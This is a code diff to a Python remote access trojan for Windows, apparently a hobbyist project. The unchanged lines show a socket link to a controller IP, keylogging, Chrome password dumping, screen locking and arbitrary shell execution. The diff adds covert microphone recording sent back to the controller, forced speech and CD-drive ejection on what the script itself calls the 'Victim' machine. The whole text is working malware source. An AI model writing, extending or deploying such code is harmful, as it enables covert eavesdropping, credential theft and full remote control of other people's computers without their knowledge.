@@ -2,14 +2,47 @@ from __future__ import print_function
 from shutil import copyfile
 from PIL import ImageGrab
 from os import getenv  
-import sqlite3, win32crypt, socket, subprocess, os, tempfile 
-import shutil, threading, win32api, pythoncom, random         
+import sqlite3, win32crypt, socket, subprocess, os, tempfile, pyaudio 
+import shutil, threading, win32api, pythoncom, random, wave        
 import numpy, sys, pyHook, shutil, cv2, time, ctypes
 
+micPath = tempfile.mkdtemp()
 keyLog = tempfile.mkdtemp()
 f_name = keyLog+"\log.txt"
-ip_address = '192.168.10.15'
+ip_address = '192.168.10.11'
 
+def activateMic(s, time):
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    CHUNK = 1024
+    RECORD_SECONDS = int(time)
+    WAVE_OUTPUT_FILENAME = micPath+"\\file.wav"
+     
+    audio = pyaudio.PyAudio()
+     
+    # start Recording
+    stream = audio.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, input=True,
+                    frames_per_buffer=CHUNK)
+    frames = []
+     
+    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+     
+    # stop Recording
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+     
+    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
+    waveFile.setnchannels(CHANNELS)
+    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+    waveFile.setframerate(RATE)
+    waveFile.writeframes(b''.join(frames))
+    waveFile.close()
+    s.send("[+] finished recording")
 
 def lockScreen():
     ctypes.windll.user32.LockWorkStation()
@@ -40,11 +73,43 @@ def get_chrome_path(s):
 
 def popUp(msg,icon,title,times):
     msgPath = tempfile.mkdtemp()
-    cmd = "echo x=MsgBox("+msg+", +"+icon+", "+title+")>"+msgPath+"\\test.vbs && "+msgPath+"\\test.vbs"
+    cmd = 'echo x=MsgBox("'+msg+'", +'+icon+', "'+title+'") > '+msgPath+'\\test.vbs && '+msgPath+'\\test.vbs'
     for _ in range(int(times)):
         subprocess.call(cmd, shell=True)
     shutil.rmtree(msgPath)
 
+def speak(msg):
+    talkPath = tempfile.mkdtemp()
+    with open(talkPath+'\\output.vbs', 'w') as file:
+	    file.write('dim speechobject\n')
+	    file.write('set speechobject=createobject("sapi.spvoice")\n')
+	    file.write('speechobject.speak("'+msg+'")')
+    talk = talkPath+"\\output.vbs"
+    subprocess.call(talk, shell=True)
+    shutil.rmtree(talkPath)
+
+def openCdDrive():
+    cdDrive = tempfile.mkdtemp()
+    with open(cdDrive+'\\open.vbs', 'w') as file:
+        file.write("Dim oWMP\n")
+        file.write("Dim colCDROMs, i\n")
+        file.write("Set oWMP = CreateObject(\"WMPlayer.OCX.7\")\n")
+        file.write("Set colCDROMs = oWMP.cdromCollection\n")
+        file.write("if colCDROMs.Count >= 1 then\n")
+        file.write("For i = 0 to colCDROMs.Count - 1\n")
+        file.write("colCDROMs.Item(i).Eject\n")
+        file.write("Next\n")
+        file.write("For i = 0 to colCDROMs.Count - 1\n")
+        file.write("colCDROMs.Item(i).Eject\n")
+        file.write("Next\n")
+        file.write("End If\n")
+        file.write("oWMP.close\n")
+        file.write("Set colCDROMs = Nothing\n")
+        file.write("Set oWMP = Nothing")
+    openDrive = cdDrive+"\\open.vbs"
+    subprocess.call(openDrive, shell=True)
+    shutil.rmtree(cdDrive)
+    
 def recWebCam():
     try:
         cap = cv2.VideoCapture(1) #Capture from webcam       
@@ -138,6 +203,8 @@ def transfer(s,path,command):
             s.send('DumpSent')
         elif 'snapshot' in command:
             s.send('snapSent')
+        elif 'getRecording' in command:
+            s.send('recordingSent')
         f.close()
     else: # the file doesn't exist
         s.send('Unable to find out the file')
@@ -190,6 +257,9 @@ def connect():
         elif 'getLogFile' in command:
             transfer(s, f_name, command)
             shutil.rmtree(keyLog)
+        elif 'openDrive' in command:
+            openCdDrive()
+            s.send("[+] CD Drive Open!")
         elif 'askPass' in command:
             askPass(s)
         elif 'chromeDump' in command:
@@ -202,6 +272,14 @@ def connect():
         elif 'lockScreen' in command:
             lockScreen()
             s.send( "[+] Victim Screen Lock")
+        elif 'activateMic' in command:
+            print '[+] Recording....'
+            call, time = command.split(' ')
+            threading.Thread(target=activateMic, args=[s, time]).start()
+            #mic.start()
+        elif 'getRecording' in command:
+            transfer(s, micPath+"\\file.wav", command)
+            shutil.rmtree(micPath)
         elif 'troll' in command:
             call, msg, icons, title, times = command.split('--')
             popUp(msg, icons, title, times)
@@ -209,6 +287,10 @@ def connect():
             code,directory = command.split (' ')
             os.chdir(directory)
             s.send( "[+] CWD Is " + os.getcwd() )
+        elif 'speak' in command:
+            code, text = command.split ('--')
+            speak(text)
+            s.send( "[+] Victim's device spoke "+text)
         else:
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send( CMD.stdout.read()  ) 
